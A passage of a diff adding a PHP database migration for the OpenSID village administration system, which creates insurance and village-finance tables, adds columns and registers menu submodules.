+ * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
+ * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
+ *
+ * @package   OpenSID
+ * @author    Tim Pengembang OpenDesa
+ * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * @copyright Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ * @license   http://www.gnu.org/licenses/gpl.html GPL V3
+ * @link      https://github.com/OpenSID/OpenSID
+ *
+ */
+
+defined('BASEPATH') || exit('No direct script access allowed');
+
+class Migrasi_1909_ke_1910 extends CI_model
+{
+    public function up()
+    {
+        // Tambah modul Keuangan
+        $this->modul_keuangan();
+        // Tambah tabel asuransi
+        if (! $this->db->table_exists('tweb_penduduk_asuransi')) {
+            $query = '
+				CREATE TABLE `tweb_penduduk_asuransi` (
+					`id` tinyint(5) NOT NULL AUTO_INCREMENT,
+					`nama` varchar(50) NOT NULL,
+					PRIMARY KEY (id)
+				)
+			';
+
+            $this->db->query($query);
+
+            $query = "INSERT INTO tweb_penduduk_asuransi (`id`, `nama`) VALUES
+				(1, 'Tidak/Belum Punya'),
+				(2, 'BPJS Penerima Bantuan Iuran'),
+				(3, 'BPJS Non Penerima Bantuan Iuran'),
+				(99, 'Asuransi Lainnya')
+			";
+
+            $this->db->query($query);
+        }
+        // Tambah kolom no_asuransi, id_asuransi
+        if (! $this->db->field_exists('id_asuransi', 'tweb_penduduk')) {
+            $fields                = [];
+            $fields['id_asuransi'] = [
+                'type'       => 'tinyint',
+                'constraint' => 5,
+                'null'       => true,
+                'default'    => null,
+            ];
+            $this->dbforge->add_column('tweb_penduduk', $fields);
+        }
+        if (! $this->db->field_exists('no_asuransi', 'tweb_penduduk')) {
+            $fields                = [];
+            $fields['no_asuransi'] = [
+                'type'       => 'char',
+                'constraint' => 100,
+                'null'       => true,
+                'default'    => null,
+            ];
+            $this->dbforge->add_column('tweb_penduduk', $fields);
+        }
+        if (! $this->db->field_exists('updated_at', 'komentar')) {
+            $this->dbforge->add_column('komentar', 'updated_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP');
+        }
+        // Tambah setting server untuk menentukan setting modul default
+        $query = $this->db->select('1')->where('key', 'penggunaan_server')->get('setting_aplikasi');
+        $query->result() || $this->db->insert('setting_aplikasi', ['key' => 'penggunaan_server', 'value' => '1	', 'jenis' => 'int', 'keterangan' => 'Setting penggunaan server', 'kategori' => 'sistem']);
+        // Tambah controller yg merupakan submodul yg tidak tampil di menu utama
+        $modul_nonmenu = [
+            'id'         => '65',
+            'modul'      => 'Kategori',
+            'url'        => 'kategori',
+            'aktif'      => '1',
+            'ikon'       => '',
+            'urut'       => '',
+            'level'      => '',
+            'parent'     => '49',
+            'hidden'     => '2',
+            'ikon_kecil' => '',
+        ];
+        $sql = $this->db->insert_string('setting_modul', $modul_nonmenu) . ' ON DUPLICATE KEY UPDATE modul = VALUES(modul), url = VALUES(url), parent = VALUES(parent)';
+        $this->db->query($sql);
+        $modul_nonmenu = [
+            'id'         => '66',
+            'modul'      => 'Log Penduduk',
+            'url'        => 'penduduk_log',
+            'aktif'      => '1',
+            'ikon'       => '',
+            'urut'       => '',
+            'level'      => '',
+            'parent'     => '21',
+            'hidden'     => '2',
+            'ikon_kecil' => '',
+        ];
+        $sql = $this->db->insert_string('setting_modul', $modul_nonmenu) . ' ON DUPLICATE KEY UPDATE modul = VALUES(modul), url = VALUES(url), parent = VALUES(parent)';
+        $this->db->query($sql);
+        $submodul_analisis = ['67' => 'analisis_kategori', '68' => 'analisis_indikator', '69' => 'analisis_klasifikasi', '70' => 'analisis_periode', '71' => 'analisis_respon', '72' => 'analisis_laporan', '73' => 'analisis_statistik_jawaban'];
+
+        foreach ($submodul_analisis as $key => $submodul) {
+            $modul_nonmenu = [
+                'id'         => $key,
+                'modul'      => $submodul,
+                'url'        => $submodul,
+                'aktif'      => '1',
+                'ikon'       => '',
+                'urut'       => '',
+                'level'      => '',
+                'parent'     => '5',
+                'hidden'     => '2',
+                'ikon_kecil' => '',
+            ];
+            $sql = $this->db->insert_string('setting_modul', $modul_nonmenu) . ' ON DUPLICATE KEY UPDATE modul = VALUES(modul), url = VALUES(url), parent = VALUES(parent)';
+            $this->db->query($sql);
+        }
+        $modul_nonmenu = [
+            'id'         => '74',
+            'modul'      => 'Wilayah',
+            'url'        => 'wilayah',
+            'aktif'      => '1',
+            'ikon'       => '',
+            'urut'       => '',
+            'level'      => '',
+            'parent'     => '21',
+            'hidden'     => '2',
+            'ikon_kecil' => '',
+        ];
+        $sql = $this->db->insert_string('setting_modul', $modul_nonmenu) . ' ON DUPLICATE KEY UPDATE modul = VALUES(modul), url = VALUES(url), parent = VALUES(parent)';
+        $this->db->query($sql);
+        $this->db->where('id', 2)->update('setting_modul', ['url' => '', 'aktif' => '1']);
+        $submodul_inventaris = ['75' => 'api_inventaris_asset', '76' => 'api_inventaris_gedung', '77' => 'api_inventaris_gedung', '78' => 'api_inventaris_jalan', '79' => 'api_inventaris_konstruksi', '80' => 'api_inventaris_peralatan', '81' => 'api_inventaris_tanah', '82' => 'inventaris_asset', '83' => 'inventaris_gedung', '84' => 'inventaris_jalan', '85' => 'inventaris_kontruksi', '86' => 'inventaris_peralatan', '87' => 'laporan_inventaris'];
+
+        foreach ($submodul_inventaris as $key => $submodul) {
+            $modul_nonmenu = [
+                'id'         => $key,
+                'modul'      => $submodul,
+                'url'        => $submodul,
+                'aktif'      => '1',
+                'ikon'       => '',
+                'urut'       => '',
+                'level'      => '',
+                'parent'     => '61',
+                'hidden'     => '2',
+                'ikon_kecil' => '',
+            ];
+            $sql = $this->db->insert_string('setting_modul', $modul_nonmenu) . ' ON DUPLICATE KEY UPDATE modul = VALUES(modul), url = VALUES(url), parent = VALUES(parent)';
+            $this->db->query($sql);
+        }
+
+        // Ubah id rtm supaya bisa lebih panjang
+        $sql = 'ALTER TABLE `tweb_rtm` CHANGE `no_kk` `no_kk` VARCHAR(30) NOT NULL';
+        $this->db->query($sql);
+        $sql = 'ALTER TABLE `tweb_penduduk` CHANGE `id_rtm` `id_rtm` VARCHAR(30) NOT NULL';
+        $this->db->query($sql);
+        $sql = 'ALTER TABLE `program_peserta` CHANGE `peserta` `peserta` VARCHAR(30) NOT NULL';
+        $this->db->query($sql);
+        $sql = 'ALTER TABLE `program_peserta` CHANGE `kartu_nik` `kartu_nik` VARCHAR(30) NOT NULL';
+        $this->db->query($sql);
+
+        // ubah/perbaiki struktur database, table artikel
+        $this->db->query('ALTER TABLE artikel MODIFY gambar VARCHAR(200) DEFAULT NULL;');
+        $this->db->query('ALTER TABLE artikel MODIFY gambar1 VARCHAR(200) DEFAULT NULL;');
+        $this->db->query('ALTER TABLE artikel MODIFY gambar2 VARCHAR(200) DEFAULT NULL;');
+        $this->db->query('ALTER TABLE artikel MODIFY gambar3 VARCHAR(200) DEFAULT NULL;');
+        $this->db->query('ALTER TABLE artikel MODIFY dokumen VARCHAR(400) DEFAULT NULL;');
+        $this->db->query('ALTER TABLE artikel MODIFY link_dokumen VARCHAR(200) DEFAULT NULL;');
+
+        // Hapus kolom artikel tidak digunakan
+        if ($this->db->field_exists('jenis_widget', 'artikel')) {
+            $this->dbforge->drop_column('artikel', 'jenis_widget');
+        }
+    }
+
+    private function modul_keuangan()
+    {
+        // Penambahan widget keuangan
+        $widget = $this->db->select('id, isi')->where('isi', 'keuangan.php')->get('widget')->row();
+        if (empty($widget)) {
+            $query = "
+				INSERT INTO widget (`isi`, `enabled`, `judul`, `jenis_widget`, `urut`, `form_admin`, `setting`) VALUES
+				('keuangan.php', '1', 'Keuangan', '1', '15', 'keuangan/widget', '');
+			";
+            $this->db->query($query);
+        }
+        // Tambah menu navigasi untuk keuangan
+        $query = "
+			INSERT INTO setting_modul (`id`, `modul`, `url`, `aktif`, `ikon`, `urut`, `level`, `parent`, `hidden`, `ikon_kecil`) VALUES
+			('201', 'Keuangan', 'keuangan', '1', 'fa-balance-scale', '6', '2', '0', '0', 'fa-balance-scale'),
+			('202', 'Impor Data', 'keuangan/impor_data', '1', 'fa-cloud-upload', '6', '2', '201', '0', 'fa-cloud-upload'),
+			('203', 'Laporan', 'keuangan/laporan', '1', 'fa-bar-chart', '6', '2', '201', '0', 'fa-bar-chart')
+			ON DUPLICATE KEY UPDATE url = VALUES(url);
+		";
+        $this->db->query($query);
+        $this->data_siskeudes();
+        $this->data_siskeudes_2018();
+    }
+
+    private function data_siskeudes_2018()
+    {
+        if ($this->db->field_exists('Alamat_Pemilik', 'keuangan_ref_bank_desa')) {
+            return;
+        }
+
+        // Tambah kolom
+        $fields                   = [];
+        $fields['Kantor_Cabang']  = ['type' => 'VARCHAR', 'constraint' => 13];
+        $fields['Nama_Pemilik']   = ['type' => 'VARCHAR', 'constraint' => 21];
+        $fields['Alamat_Pemilik'] = ['type' => 'VARCHAR', 'constraint' => 12];
+        $fields['No_Identitas']   = ['type' => 'INT'];
+        $fields['No_Telepon']     = ['type' => 'INT'];
+        $this->dbforge->add_column('keuangan_ref_bank_desa', $fields);
+    }
+
+    private function data_siskeudes()
+    {
+        //insert tabel2 untuk keuangan
+        if (! $this->db->table_exists('keuangan_master')) {
+            $query = "
+			CREATE TABLE IF NOT EXISTS `keuangan_master` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`versi_database` varchar(50) NOT NULL,
+				`tahun_anggaran` varchar(250) NOT NULL,
+				`aktif` int(2) NOT NULL DEFAULT '1',
+				`tanggal_impor` date NOT NULL,
+				PRIMARY KEY (`id`)
+			)";
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_bank_desa
+        if (! $this->db->table_exists('keuangan_ref_bank_desa')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_bank_desa` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(50) NOT NULL,
+				`Kd_Desa` varchar(50) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`NoRek_Bank` varchar(100) NOT NULL,
+				`Nama_Bank` varchar(250) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_bel_operasional
+        if (! $this->db->table_exists('keuangan_ref_bel_operasional')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_bel_operasional` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`ID_Keg` varchar(50) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_bidang
+        if (! $this->db->table_exists('keuangan_ref_bidang')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_bidang` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Bid` varchar(50) NOT NULL,
+				`Nama_Bidang` varchar(250) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_bunga
+        if (! $this->db->table_exists('keuangan_ref_bunga')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_bunga` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Bunga` varchar(50) NOT NULL,
+				`Kd_Admin` varchar(50) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_desa
+        if (! $this->db->table_exists('keuangan_ref_desa')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_desa` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Kec` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Nama_Desa` varchar(250) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_kecamatan
+        if (! $this->db->table_exists('keuangan_ref_kecamatan')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_kecamatan` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Kec` varchar(100) NOT NULL,
+				`Nama_Kecamatan` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_kegiatan
+        if (! $this->db->table_exists('keuangan_ref_kegiatan')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_kegiatan` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Bid` varchar(100) NOT NULL,
+				`ID_Keg` varchar(100) NOT NULL,
+				`Nama_Kegiatan` varchar(250) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_korolari
+        if (! $this->db->table_exists('keuangan_ref_korolari')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_korolari` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Kd_RekDB` varchar(100) NOT NULL,
+				`Kd_RekKD` varchar(250) NOT NULL,
+				`Jenis` int(11) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_neraca_close
+        if (! $this->db->table_exists('keuangan_ref_neraca_close')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_neraca_close` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Kelompok` varchar(250) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_perangkat
+        if (! $this->db->table_exists('keuangan_ref_perangkat')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_perangkat` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kode` varchar(100) NOT NULL,
+				`Nama_Perangkat` varchar(250) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_potongan
+        if (! $this->db->table_exists('keuangan_ref_potongan')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_potongan` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Kd_Potongan` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_potongan
+        if (! $this->db->table_exists('keuangan_ref_rek1')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_rek1` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Akun` varchar(100) NOT NULL,
+				`Nama_Akun` varchar(100) NOT NULL,
+				`NoLap` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_rek2
+        if (! $this->db->table_exists('keuangan_ref_rek2')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_rek2` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Akun` varchar(100) NOT NULL,
+				`Kelompok` varchar(100) NOT NULL,
+				`Nama_Kelompok` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_rek3
+        if (! $this->db->table_exists('keuangan_ref_rek3')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_rek3` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kelompok` varchar(100) NOT NULL,
+				`Jenis` varchar(100) NOT NULL,
+				`Nama_Jenis` varchar(100) NOT NULL,
+				`Formula`int(11) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_rek4
+        if (! $this->db->table_exists('keuangan_ref_rek4')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_rek4` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Jenis` varchar(100) NOT NULL,
+				`Obyek` varchar(100) NOT NULL,
+				`Nama_Obyek` varchar(100) NOT NULL,
+				`Peraturan` varchar(250) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_sbu
+        if (! $this->db->table_exists('keuangan_ref_sbu')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_sbu` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Kode_SBU` varchar(100) NOT NULL,
+				`NoUrut_SBU` varchar(100) NOT NULL,
+				`Nama_SBU` varchar(100) NOT NULL,
+				`Nilai` varchar(100) NOT NULL,
+				`Satuan` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ref_sumber
+        if (! $this->db->table_exists('keuangan_ref_sumber')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ref_sumber` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Kode` varchar(100) NOT NULL,
+				`Nama_Sumber` varchar(100) NOT NULL,
+				`Urut` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_anggaran
+        if (! $this->db->table_exists('keuangan_ta_anggaran')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_anggaran` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`KdPosting` varchar(100) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`KURincianSD` varchar(100) NOT NULL,
+				`KD_Rincian` varchar(100) NOT NULL,
+				`RincianSD` varchar(100) NOT NULL,
+				`Anggaran` varchar(100) NOT NULL,
+				`AnggaranPAK` varchar(100) NOT NULL,
+				`AnggaranStlhPAK` varchar(100) NOT NULL,
+				`Belanja` varchar(100) NOT NULL,
+				`Kd_keg` varchar(100) NOT NULL,
+				`SumberDana` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`TglPosting` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert  keuangan_ta_anggaran_log
+        if (! $this->db->table_exists(' keuangan_ta_anggaran_log')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_anggaran_log` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`KdPosting` varchar(100) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_Perdes` varchar(100) NOT NULL,
+				`TglPosting` varchar(100) NOT NULL,
+				`UserID` int(11) NOT NULL,
+				`Kunci` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_anggaran_rinci
+        if (! $this->db->table_exists('keuangan_ta_anggaran_rinci')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_anggaran_rinci` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`KdPosting` varchar(100) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Kd_SubRinci` varchar(100) NOT NULL,
+				`No_Urut` varchar(100) NOT NULL,
+				`Uraian` varchar(100) NOT NULL,
+				`SumberDana` varchar(100) NOT NULL,
+				`JmlSatuan` varchar(100) NOT NULL,
+				`HrgSatuan` varchar(100) NOT NULL,
+				`Satuan` varchar(100) NOT NULL,
+				`Anggaran` varchar(100) NOT NULL,
+				`JmlSatuanPAK` varchar(100) NOT NULL,
+				`HrgSatuanPAK` varchar(100) NOT NULL,
+				`AnggaranStlhPAK` varchar(100) NOT NULL,
+				`AnggaranPAK` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_bidang
+        if (! $this->db->table_exists('keuangan_ta_bidang')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_bidang` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Bid` varchar(100) NOT NULL,
+				`Nama_Bidang` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_desa
+        if (! $this->db->table_exists('keuangan_ta_desa')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_desa` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Nm_Kades` varchar(100) NOT NULL,
+				`Jbt_Kades` varchar(100) NOT NULL,
+				`Nm_Sekdes` varchar(100) NOT NULL,
+				`NIP_Sekdes` varchar(100) NOT NULL,
+				`Jbt_Sekdes` varchar(100) NOT NULL,
+				`Nm_Kaur_Keu` varchar(100) NOT NULL,
+				`Jbt_Kaur_Keu` varchar(100) NOT NULL,
+				`Nm_Bendahara` varchar(100) NOT NULL,
+				`Jbt_Bendahara` varchar(100) NOT NULL,
+				`No_Perdes` varchar(100) NOT NULL,
+				`Tgl_Perdes` varchar(100) NOT NULL,
+				`No_Perdes_PB` varchar(100) NOT NULL,
+				`Tgl_Perdes_PB` varchar(100) NOT NULL,
+				`No_Perdes_PJ` varchar(100) NOT NULL,
+				`Tgl_Perdes_PJ` varchar(100) NOT NULL,
+				`Alamat` varchar(250) NOT NULL,
+				`Ibukota` varchar(100) NOT NULL,
+				`Status` varchar(100) NOT NULL,
+				`NPWP` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_jurnal_umum
+        if (! $this->db->table_exists('keuangan_ta_jurnal_umum')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_jurnal_umum` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`KdBuku` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Tanggal` varchar(100) NOT NULL,
+				`JnsBukti` varchar(100) NOT NULL,
+				`NoBukti` varchar(100) NOT NULL,
+				`Keterangan` varchar(100) NOT NULL,
+				`DK` varchar(100) NOT NULL,
+				`Debet` varchar(100) NOT NULL,
+				`Kredit` varchar(100) NOT NULL,
+				`Jenis` varchar(100) NOT NULL,
+				`Posted` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_jurnal_umum_rinci
+        if (! $this->db->table_exists('keuangan_ta_jurnal_umum_rinci')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_jurnal_umum_rinci` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`NoBukti` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`RincianSD` varchar(100) NOT NULL,
+				`NoID` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Akun` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Sumberdana` varchar(100) NOT NULL,
+				`DK` varchar(100) NOT NULL,
+				`Debet` varchar(100) NOT NULL,
+				`Kredit` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_kegiatan
+        if (! $this->db->table_exists('keuangan_ta_kegiatan')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_kegiatan` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`Kd_Bid` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`ID_Keg` varchar(100) NOT NULL,
+				`Nama_Kegiatan` varchar(100) NOT NULL,
+				`Pagu` varchar(100) NOT NULL,
+				`Pagu_PAK` varchar(100) NOT NULL,
+				`Nm_PPTKD` varchar(100) NOT NULL,
+				`NIP_PPTKD` varchar(100) NOT NULL,
+				`Lokasi` varchar(100) NOT NULL,
+				`Waktu` varchar(100) NOT NULL,
+				`Keluaran` varchar(100) NOT NULL,
+				`Sumberdana` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_mutasi
+        if (! $this->db->table_exists('keuangan_ta_mutasi')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_mutasi` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_Bukti` varchar(100) NOT NULL,
+				`Tgl_Bukti` varchar(100) NOT NULL,
+				`Keterangan` varchar(100) NOT NULL,
+				`Kd_Bank` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Kd_Keg` varchar(100) NOT NULL,
+				`Sumberdana` varchar(100) NOT NULL,
+				`Kd_Mutasi` varchar(100) NOT NULL,
+				`Nilai` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_pajak
+        if (! $this->db->table_exists('keuangan_ta_pajak')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_pajak` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_SSP` varchar(100) NOT NULL,
+				`Tgl_SSP` varchar(100) NOT NULL,
+				`Keterangan` varchar(100) NOT NULL,
+				`Nama_WP` varchar(100) NOT NULL,
+				`Alamat_WP` varchar(100) NOT NULL,
+				`NPWP` varchar(100) NOT NULL,
+				`Kd_MAP` varchar(100) NOT NULL,
+				`Nm_Penyetor` varchar(100) NOT NULL,
+				`Jn_Transaksi` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Jumlah` varchar(100) NOT NULL,
+				`KdBayar` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_pajak_rinci
+        if (! $this->db->table_exists('keuangan_ta_pajak_rinci')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_pajak_rinci` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Desa` varchar(100) NOT NULL,
+				`No_SSP` varchar(100) NOT NULL,
+				`No_Bukti` varchar(100) NOT NULL,
+				`Kd_Rincian` varchar(100) NOT NULL,
+				`Nilai` varchar(100) NOT NULL,
+				PRIMARY KEY (`id`)
+			)';
+            $this->db->query($query);
+        }
+
+        //insert keuangan_ta_pemda
+        if (! $this->db->table_exists('keuangan_ta_pemda')) {
+            $query = '
+			CREATE TABLE IF NOT EXISTS `keuangan_ta_pemda` (
+				`id` int(11) NOT NULL AUTO_INCREMENT,
+				`id_keuangan_master` int(11) NOT NULL,
+				`Tahun` varchar(100) NOT NULL,
+				`Kd_Prov` varchar(100) NOT NULL,
+				`Kd_Kab` varchar(100) NOT NULL,
+				`Nama_Pemda` varchar(100) NOT NULL,
+				`Nama_Provinsi` varchar(100) NOT NULL,
+				`Ibukota` varchar(100) NOT NULL,
+				`Alamat` varchar(100) NOT NULL,
+				`Nm_Bupati` varchar(100) NOT NULL,
+				`Jbt_Bupati` varchar(100) NOT NULL,
+				`Logo` varchar(100) NOT NULL,
+				`C_Kode` varchar(100) NOT NULL,
+				`C_Pemda` varchar(100) NOT NULL,
+				`C_Data` varchar(100) NOT NULL,
